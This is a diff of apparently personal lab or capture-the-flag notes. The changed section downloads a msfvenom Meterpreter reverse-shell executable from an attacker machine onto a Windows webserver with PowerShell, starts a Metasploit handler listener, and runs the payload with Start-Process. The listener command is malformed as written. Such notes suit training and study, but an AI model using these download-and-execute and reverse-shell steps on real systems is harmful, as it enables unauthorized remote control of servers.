@@ -128,8 +128,21 @@ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai 
 2. Lets download it from our attacker machine onto the webserver using the below command
 
 ```shell
-powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.0.75:8000/shell-name.exe','shell-name.exe')"
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.0.75:8000/shell-name1.exe','shell-name1.exe')"
 ```
 
+![[Pasted image 20251013221421.png]]
+
+## Setup a Meterpreter Listener 
+```
+msfconsole -q -x "use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 10.9.0.78 set 9090 listening-port run"
+```
+![[Pasted image 20251013222045.png]]
+
+## Execute the payload on the webserver
+use the following command in the shell code on the webserver
+```
+Start-Process "shell-name1.exe"
+```
 
 
